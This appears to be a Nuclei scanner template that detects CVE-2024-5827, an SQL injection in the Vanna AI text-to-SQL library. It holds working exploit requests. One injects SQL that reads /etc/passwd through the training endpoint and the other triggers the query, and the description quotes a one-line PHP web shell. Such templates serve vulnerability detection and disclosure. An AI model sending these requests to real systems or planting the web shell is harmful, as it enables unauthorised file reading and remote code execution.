flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - 'id":'
  raw:
  - 'POST /api/v0/train HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"sql":"SELECT pg_read_file(''/etc/passwd'', 0, 1000);"}

    '
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - application/json
  matchers-condition: and
  raw:
  - 'GET /api/v0/generate_sql?question=What%20is%20the%20content%20of%20the%20first%201000%20characters%20of%20the%20%2Fetc%2Fpasswd%20file?
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-5827
info:
  author: olfloralo,nukunga,harksu,nechyo,gy741
  classification:
    cve-id: CVE-2024-5827
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.97167
    epss-score: 0.39855
  description: 'Vanna v0.3.4 is vulnerable to SQL injection in its DuckDB integration
    exposed to its Flask Web APIs. Attackers can inject malicious SQL training data
    and generate corresponding queries to write arbitrary files on the victim''s file
    system, such as backdoor.php with contents `<?php system($_GET[0]); ?>`. This
    can lead to command execution or the creation of backdoors.

    '
  impact: 'Unauthenticated attackers can exploit SQL injection to inject malicious
    training data and write arbitrary files on the victim''s filesystem, including
    PHP backdoors, leading to remote code execution.

    '
  metadata:
    fofa-query: body='vanna.ai'
    max-request: 2
    verified: true
  name: Vanna - SQL injection
  reference:
  - https://huntr.com/bounties/a3f913d6-c717-4528-b974-26d8d9e839ca
  - https://nvd.nist.gov/vuln/detail/CVE-2024-5827
  - https://huntr.com/bounties/e4e64a51-618b-41d0-8f56-1d2146d8825e
  - https://github.com/fkie-cad/nvd-json-data-feeds
  remediation: 'Update Vanna to version 0.3.5 or later to address the SQL injection
    vulnerability in the DuckDB integration.

    '
  severity: critical
  tags: cve,cve2024,vanna,sqli,vkev,vuln
